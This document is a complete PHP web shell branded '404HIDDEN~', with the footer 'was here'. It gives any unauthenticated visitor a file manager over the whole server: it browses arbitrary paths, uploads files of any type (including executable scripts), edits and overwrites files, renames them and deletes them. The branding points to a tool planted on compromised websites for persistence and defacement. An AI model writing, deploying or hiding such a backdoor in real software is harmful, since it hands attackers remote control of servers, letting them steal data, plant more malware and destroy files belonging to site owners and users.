<?php

$path = isset($_GET['path']) ? realpath($_GET['path']) : realpath(__DIR__);
if(!$path) $path = realpath(__DIR__);
$parent = dirname($path);

if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])){
    $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
    $new = bin2hex(random_bytes(8)) . '.' . $ext;
    move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . $new);
    header("Location: ?path=" . urlencode($path));
    exit;
}
if(isset($_GET['del'])){ $t=$path.'/'.basename($_GET['del']); is_dir($t)?rmdir($t):unlink($t); header("Location: ?path=".urlencode($path)); exit; }
if(isset($_POST['mkdir'])){ mkdir($path.'/'.trim($_POST['name']),0777); header("Location: ?path=".urlencode($path)); exit; }
if(isset($_POST['rename'])){ rename($path.'/'.basename($_POST['old']), $path.'/'.basename($_POST['new'])); header("Location: ?path=".urlencode($path)); exit; }
if(isset($_POST['save'])){ file_put_contents($path.'/'.basename($_POST['file']), $_POST['content']); header("Location: ?path=".urlencode($path)."&edit=".urlencode($_POST['file'])); exit; }

$items = scandir($path);
?>
<!DOCTYPE html>
<html>
<head>
    <title>404HIDDEN~ NOPANIK</title>
    <style>
        body {
            background: #1a1a1a;
            color: #d4d4d4;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #2d2d2d;
            border: 2px solid #6a6a6a;
            box-shadow: 8px 8px 0 #0a0a0a;
        }
        .header {
            background: #3a3a3a;
            padding: 15px;
            border-bottom: 2px solid #6a6a6a;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        .logo-left {
            width: 200px;
            height: auto;
            border: 1px solid #6a6a6a;
            background: #1a1a1a;
            padding: 5px;
        }
        .logo-right {
            width: 200px;
            height: auto;
            border: 1px solid #6a6a6a;
            background: #1a1a1a;
            padding: 5px;
        }
        .telegram-link {
            background: #2d2d2d;
            border: 1px solid #6a6a6a;
            padding: 8px 20px;
            color: #d4d4d4;
            text-decoration: none;
            font-family: monospace;
            font-weight: bold;
            box-shadow: 2px 2px 0 #0a0a0a;
        }
        .telegram-link:hover {
            background: #6a6a6a;
            color: #1a1a1a;
            border-color: #d4d4d4;
        }
        .path {
            background: #1a1a1a;
            padding: 12px;
            margin: 15px;
            border: 1px solid #6a6a6a;
            font-family: monospace;
            word-break: break-all;
        }
        .path a {
            color: #d4d4d4;
            text-decoration: none;
        }
        .path a:hover {
            text-decoration: underline;
            color: #ffffff;
        }
        .forms {
            margin: 15px;
            padding: 10px;
            background: #3a3a3a;
            border: 1px solid #6a6a6a;
        }
        input, button, textarea {
            background: #1a1a1a;
            border: 1px solid #6a6a6a;
            color: #d4d4d4;
            padding: 6px 10px;
            font-family: monospace;
            margin: 2px;
        }
        button {
            background: #3a3a3a;
            cursor: pointer;
        }
        button:hover {
            background: #6a6a6a;
            color: #1a1a1a;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px;
            width: calc(100% - 30px);
        }
        th, td {
            border: 1px solid #6a6a6a;
            padding: 8px;
            text-align: left;
        }
        th {
            background: #3a3a3a;
        }
        a {
            color: #d4d4d4;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        hr {
            border-color: #6a6a6a;
            margin: 15px;
        }
        h1, h3 {
            margin: 0 15px;
            font-family: monospace;
            font-weight: normal;
        }
        .footer {
            text-align: center;
            padding: 10px;
            border-top: 2px solid #6a6a6a;
            background: #3a3a3a;
            font-size: 12px;
        }
        .breadcrumb {
            display: inline-block;
        }
        .breadcrumb a {
            background: #2d2d2d;
            padding: 3px 8px;
            margin: 0 2px;
            border: 1px solid #6a6a6a;
        }
        .breadcrumb a:hover {
            background: #6a6a6a;
            color: #1a1a1a;
        }
        .shadow-text {
            color: #ff4444;
            font-size: 14px;
            margin-left: 10px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <img class="logo-left" src="https://ik.imagekit.io/expx/international-womens-day.gif" alt="logo">
        <div style="display:flex; align-items:center;">
            <a href="https://www.google.com/search?q=find+lost+cat" target="_blank" class="telegram-link">TELEGRAM</a>
            <span class="shadow-text">404HIDDEN~ was here </span>
        </div>
        <img class="logo-right" src="https://ik.imagekit.io/expx/images_mini/join-cuan-terus.jpg" alt="logo">
    </div>

    <div class="path">
        <strong>PATH: <?= $path ?></strong>
        <br><br>
        <div class="breadcrumb">
            <a href="?path=<?= urlencode(dirname($path, 10)) ?>">ROOT</a>
            <?php 
            $parts = explode(DIRECTORY_SEPARATOR, $path);
            $p = '';
            foreach($parts as $part):
                if(empty($part)) continue;
                $p .= '/' . $part;
                echo ' > <a href="?path='.urlencode($p).'">'.$part.'</a>';
            endforeach;
            ?>
        </div>
        <br>
        <small><a href="?path=<?= urlencode($parent) ?>">[ GO BACK ]</a></small>
    </div>

    <div class="forms">
        <form method="post" enctype="multipart/form-data" style="display:inline">
            <input type="file" name="file">
            <button>UPLOAD</button>
        </form>
        <form method="post" style="display:inline">
            <input type="text" name="name" placeholder="folder name">
            <button name="mkdir">NEW FOLDER</button>
        </form>
    </div>

    <h3>CONTENTS:</h3>
    <table>
        <tr><th>NAME</th><th>SIZE</th><th>ACTIONS</th></tr>
        <?php foreach($items as $item):
            if($item == '.' || $item == '..') continue;
            $full = $path . '/' . $item;
            $is_dir = is_dir($full);
        ?>
        <tr>
            <td>
                <?php if($is_dir): ?>
                    [DIR] <a href="?path=<?= urlencode($full) ?>"><?= htmlspecialchars($item) ?></a>
                <?php else: ?>
                    [FILE] <?= htmlspecialchars($item) ?>
                <?php endif; ?>
            </td>
            <td><?= $is_dir ? '-' : round(filesize($full)/1024,2) . ' KB' ?></td>
            <td>
                <?php if(!$is_dir): ?>
                    <a href="?path=<?= urlencode($path) ?>&edit=<?= urlencode($item) ?>">EDIT</a> |
                    <a href="<?= $full ?>" download>DL</a> |
                <?php endif; ?>
                <a href="?path=<?= urlencode($path) ?>&rename=<?= urlencode($item) ?>">RENAME</a> |
                <a href="?path=<?= urlencode($path) ?>&del=<?= urlencode($item) ?>" onclick="return confirm('Delete?')">DEL</a>
              </td>
          </tr>
        <?php endforeach; ?>
    </table>

    <?php if(isset($_GET['rename'])): $old = $_GET['rename']; ?>
    <hr>
    <h3>RENAME: <?= htmlspecialchars($old) ?></h3>
    <div class="forms">
        <form method="post">
            <input type="hidden" name="old" value="<?= htmlspecialchars($old) ?>">
            <input type="text" name="new" placeholder="new name" required>
            <button name="rename">SAVE</button>
        </form>
    </div>
    <?php endif; ?>

    <?php if(isset($_GET['edit']) && !is_dir($path . '/' . $_GET['edit'])): $file = $_GET['edit']; $content = file_get_contents($path . '/' . $file); ?>
    <hr>
    <h3>EDITING: <?= htmlspecialchars($file) ?></h3>
    <div class="forms">
        <form method="post">
            <textarea name="content" rows="15" style="width:100%;background:#1a1a1a;border:1px solid #6a6a6a;color:#d4d4d4;"><?= htmlspecialchars($content) ?></textarea>
            <br><br>
            <input type="hidden" name="file" value="<?= htmlspecialchars($file) ?>">
            <button name="save">SAVE</button>
        </form>
    </div>
    <?php endif; ?>

    <div class="footer">
        FILE TOLOL - 404HIDDEN~
    </div>
</div>
</body>
</html>
